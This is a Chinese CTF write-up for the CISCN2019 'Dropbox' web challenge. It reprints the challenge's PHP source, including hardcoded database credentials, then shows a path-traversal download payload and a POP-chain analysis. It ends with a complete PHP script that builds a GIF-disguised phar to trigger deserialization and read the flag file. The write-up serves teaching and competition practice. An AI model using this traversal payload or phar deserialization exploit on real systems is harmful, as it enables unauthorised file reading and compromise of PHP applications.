# \[CISCN2019 华北赛区 Day1 Web1]Dropbox

## \[CISCN2019 华北赛区 Day1 Web1]Dropbox

## 考点

* 任意文件下载
* phar反序列化

## wp

flag在/flag.txt

正常登陆注册，然后有个文件上传的功能，上传完成之后可以选择下载和删除

burp抓包，在下载的时候可以修改下载的文件，进而获取文件源码，修改为`filename=../../index.php`

![](<../../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png>)

读取download.php，发现可以进行文件读取但是读取不了flag。并且它设置了open\_basedir，只能访问当前目录，/tmp和/etc

```php
<?php
include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

在class.php中定义了很多类

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>

```

在upload.php使用白名单限制上传文件

```php
<?php
include "class.php";

if (isset($_FILES["file"])) {
    $filename = $_FILES["file"]["name"];
    $pos = strrpos($filename, ".");
    if ($pos !== false) {
        $filename = substr($filename, 0, $pos);
    }
    
    $fileext = ".gif";
    switch ($_FILES["file"]["type"]) {
        case 'image/gif':
            $fileext = ".gif";
            break;
        case 'image/jpeg':
            $fileext = ".jpg";
            break;
        case 'image/png':
            $fileext = ".png";
            break;
        default:
            $response = array("success" => false, "error" => "Only gif/jpg/png allowed");
            Header("Content-type: application/json");
            echo json_encode($response);
            die();
    }

    if (strlen($filename) < 40 && strlen($filename) !== 0) {
        $dst = $_SESSION['sandbox'] . $filename . $fileext;
        move_uploaded_file($_FILES["file"]["tmp_name"], $dst);
        $response = array("success" => true, "error" => "");
        Header("Content-type: application/json");
        echo json_encode($response);
    } else {
        $response = array("success" => false, "error" => "Invaild filename");
        Header("Content-type: application/json");
        echo json_encode($response);
    }
}
?>
```

在delete.php提供文件删除功能

```php
<?php
include "class.php";
chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

上传白名单+各种类+文件读取与删除，必然是phar

上传图片，在delete.php触发phar，剩下的就是找pop链。反序列化从`__destruct()`入手，FileList类的太复杂了，从User类入手。比较容易发现的这个链子，但是这里只是`return`无法将`file_get_contents`的结果输出

```php
class User {
    public function __destruct() {
        $this->db->close();
    }
}

class File {
    public function close() {
        return file_get_contents($this->filename);
    }
}
```

还有就是FileList类了，User类的db为FileList类，触发`FileList::__call`函数，然后把close放到FileList类的funcs中，也即func，FileList类的file为File类，这样就能调用File类的close函数，读取flag，并且将结果给FileList类的results数组，`$this->results["flag.txt"]["close"]="flag{***}"`

```php
class User {
    public function __destruct() {
        $this->db->close();
    }
}
class FileList {
    private $files;
    private $results;
    private $funcs;
    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
}
class File {
    public $filename
    public function name() {
        return basename($this->filename);
    } 
    public function close() {
        return file_get_contents($this->filename);
    }
}
```

exp

```php
<?php
class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}
$a = new User();
$a->db = new FileList();

$phar = new Phar('123.phar',0,'123.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');


$phar->setMetadata($a);
$phar->addFromString('text.txt','test');
$phar->stopBuffering();
```

上传，然后在delete.php处触发phar

![](<../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png>)

## 小结

1. 上传白名单+各种类+文件读取与删除，考虑是phar
